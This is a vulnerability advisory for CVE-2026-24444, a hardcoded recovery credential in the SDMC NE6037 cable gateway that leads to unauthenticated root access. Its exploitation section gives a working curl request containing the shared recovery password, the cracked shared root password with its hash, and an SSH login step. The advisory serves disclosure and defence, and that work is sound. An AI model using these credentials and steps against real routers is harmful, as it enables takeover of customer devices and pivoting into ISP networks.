# SDMC NE6037: Hardcoded Recovery Credential in Web Management Interface leads to Unauthenticated Root Access

- **Advisory ID:** MCSAID-2026-043
- **CVE ID:** [CVE-2026-24444](https://www.cve.org/CVERecord?id=CVE-2026-24444)
- **Reported:** 2026-01-28
- **Published:** 2026-05-28
- **Severity:** Critical (CVSS 9.8 – CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)
- **CVSS 4.0:** 9.3 (CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:H/VI:H/VA:H/SC:N/SI:N/SA:N)
- **Vulnerability type:** Use of hard-coded credentials, Authentication bypass, Unauthenticated remote root access
- **Current state:** No vendor-published fix. SDMC stated (via the ISP) that it would remove the SSH/Telnet backdoor and assign a unique root password per device. Not verified whether the 7.1.12.x firmware branch is affected.
- **Exploitation:** Easy, deterministic, a single unauthenticated HTTP request, public PoC available, not seen in the wild
- **Software:** [SDMC NE6037](https://en.sdmctech.com/product/DOCSIS_234.html) – DOCSIS 3.1 cable gateway (web management interface, `/usr/www`)
- **CWE:** [CWE-798: Use of Hard-coded Credentials](https://cwe.mitre.org/data/definitions/798.html)
- **Discovered by:** Ivan Racic of Marlink Cyber

---

## Summary

The web management interface of the SDMC NE6037 cable gateway exposes a console recovery endpoint, `/cgi-bin/recovery.php`, which is reachable without a session token and is automatically granted admin privileges by the web framework. The handler behind it, `handleConsoleRecovery()` in `mgmt.php`, authenticates the request only by comparing the `password` query parameter against a hardcoded value that is identical on every device.

When the hardcoded value is supplied, the handler can modify the router configuration via `cgiScalarSetConfig()` and calls `exec()` to insert `iptables` / `ip6tables` rules that open SSH (22/tcp) and Telnet (23/tcp) on the LAN interface. Combined with the shared, hardcoded `root` password shipped in the firmware, an unauthenticated attacker with network access to the web interface obtains a root shell on the device.

---

## Affected Versions

| Version | Status |
|---------|--------|
| NE6037 firmware 7.1.6.0.25 | Vulnerable |
| NE6037 firmware 7.1.6.1.9_B9 | Vulnerable |
| NE6037 firmware 7.1.12.x | Unknown (not tested) |

Reproduced on SDMC NE6037 firmware 7.1.6.0.25. The ISP's security team confirmed the backdoor is still present in a slightly newer build, with only the `root` password changed.

---

## Impact

An unauthenticated attacker who can reach the router's web management interface gains root-level access to the device. On the tested device the root shell exposed eight network interfaces with addresses in several private ranges, only one of which was the customer LAN; the others appear to be ISP internal / backend networks. A compromised CPE can therefore be used as a pivot point both into the customer's network and into the ISP's infrastructure.

From the LAN the attack requires no prior access. Where the management interface is exposed to the Internet (for example, customers opted out of CGNAT), it is remotely exploitable. Note that SSH / Telnet access is allowed only from LAN interfaces.

---

## Exploitation

The attacker sends a single HTTP GET request to `/cgi-bin/recovery.php` with `username=admin`, the hardcoded recovery password and `commit=false`. The handler returns `success` and inserts firewall rules that allow SSH and Telnet from the LAN. The attacker then logs in over SSH as `root` with the hardcoded root password.

```
curl -Lknv 'http://192.168.0.1/cgi-bin/recovery.php?username=admin&password=YzVlY2UxMDc4MmEzYjYzNDM3OTY5NzkyYWQ1YWM2MGEK&commit=false'
ssh root@192.168.0.1        # password: 1qaz@WSX (firmware 7.1.6.0.25)
```

The `root` password was recovered from `/etc/shadow` (SHA-512 crypt) with John the Ripper:

```
root:$6$0OSd5XYncb/fI$5tdg8kOFc27q2tBujKoa7CnhSNG4N0KrUgIZ93xjDRiyimo1Mj46kcfPnt2krrGZNM08SaF/0r2rNMvKDW2e7/
```

```
➜  john root-hash.txt --wordlist=wl.txt --rule=jumbo
Loaded 1 password hash (sha512crypt, crypt(3) $6$ [SHA512 512/512 AVX-512 8x])
1qaz@WSX         (root)
1g 0:00:00:00 DONE (2025-12-16 17:58) 20.00g/s 40.00p/s 40.00c/s 40.00C/s jS8xuvy..1qaz@WSX
```

The finding was confirmed by resetting the router to factory settings and repeating the two steps above.

## Details

### Affected code

- **Directory:** `/usr/www` (web management interface)
- **File:** `mgmt.php`
  - line 729: definition of `handleConsoleRecovery()`
  - line 731: `$code` is initialised to `"success"`
  - lines 737-738: `username` and `password` are taken from the query string via `utilsGetQueryString()`
  - line 764: `if ($code === "success")` block, reached when the password matches the hardcoded value
  - lines 778-781: `exec()` of `iptables` / `ip6tables` rules allowing SSH / Telnet from the LAN interface
- **File:** `php/lib/handler.php` – `DECL_BYPASS("recovery.php", "handleConsoleRecovery")`
- **Function:** `getCgiPublicUrls()` – registers `recovery.php` as a public URL

The CVE record also lists `npcmd.php` as an affected recovery endpoint.

### Root cause

`recovery.php` is registered in `getCgiPublicUrls()`, so the framework requires no token and auto-grants admin privileges to the request. It is mapped to `handleConsoleRecovery()` in `mgmt.php` through `DECL_BYPASS()`. The only check in that handler is a comparison of the supplied password with the hardcoded constant `YzVlY2UxMDc4MmEzYjYzNDM3OTY5NzkyYWQ1YWM2MGEK`, which is the same on every device. On a match, `$code` stays `"success"` and the handler applies configuration changes and opens SSH / Telnet via `exec()`.

The device additionally ships with a hardcoded, shared `root` password, which turns the firewall change into a root shell. SDMC's announced remediation (removing the backdoor and assigning per-device root passwords) implicitly confirms that devices ship with the same hardcoded root credentials.

---

## Indicators

**On host:**

- New `iptables` / `ip6tables` rules allowing TCP 22 / 23 on the LAN management chain (e.g. `lan2self_mgmt`) that were not configured by the operator.
- SSH or Telnet listening and reachable from the LAN.
- `root` logins over SSH / Telnet.

**On network:**

- HTTP(S) GET requests to `/cgi-bin/recovery.php` (or `npcmd.php`) carrying `username` and `password` query parameters.
- Unauthenticated JSON-RPC `SYS.getRunning` requests to `/cgi-bin/router.php` used for fingerprinting.

---

## Mitigations

No fixed firmware has been published by SDMC. In this case the ISP confirmed the issue internally and rolled out an update to its customer routers. SDMC stated through the ISP that it would:

- remove the SSH/Telnet backdoor;
- assign a unique root password per device;
- add an "ERP certification" feature.

---

## Recommendations

- Do not expose the router's web management interface, or any other service on the router, to the Internet without at least IP allowlisting.
- ISPs should push the latest firmware to customer CPE devices and verify that the recovery endpoint is removed and that root passwords are unique per device.
- Customers whose router does not run the latest firmware should contact their ISP and request an update.
- Monitor for the indicators listed above.

---

## Timeline

- 2025-12 – Vulnerability discovered
- 2026-01-22 – CVE-2026-24444 reserved by VulnCheck
- 2026-01-28 – Vulnerability reported to SDMC, the ISP and VulnCheck
- 2026-02 – ISP confirmed the backdoor in a newer build and rolled out a firmware update to customer routers
- 2026-05-28 – VulnCheck 120-day disclosure deadline; no response from SDMC
- 2026-05-28 – CVE-2026-24444 published, technical write-up released
- 2026-11-03 – Marlink Cyber advisory released

---

## References

- CVE record: [CVE-2026-24444](https://www.cve.org/CVERecord?id=CVE-2026-24444)
- VulnCheck advisory: [SDMC NE6037 Hardcoded Password via mgmt.php/npcmd.php](https://www.vulncheck.com/advisories/sdmc-ne6037-hardcoded-password-via-mgmt-php-npcmd-php)
- Related (used for initial access): [CVE-2025-8890](https://nvd.nist.gov/vuln/detail/CVE-2025-8890) – [Securitum](https://www.securitum.com/cve-2025-8890.html), [CERT.pl](https://cert.pl/en/posts/2025/11/CVE-2025-8890/)
- Marlink Cyber Security Advisory: [MCSAID-2026-043](https://github.com/marlinkcyber/advisories/blob/main/advisories/MCSAID-2026-043-sdmc-ne6037-hardcoded-recovery-credential-unauthenticated-root-access.md)
- Software: [SDMC NE6037](https://en.sdmctech.com/product/DOCSIS_234.html)
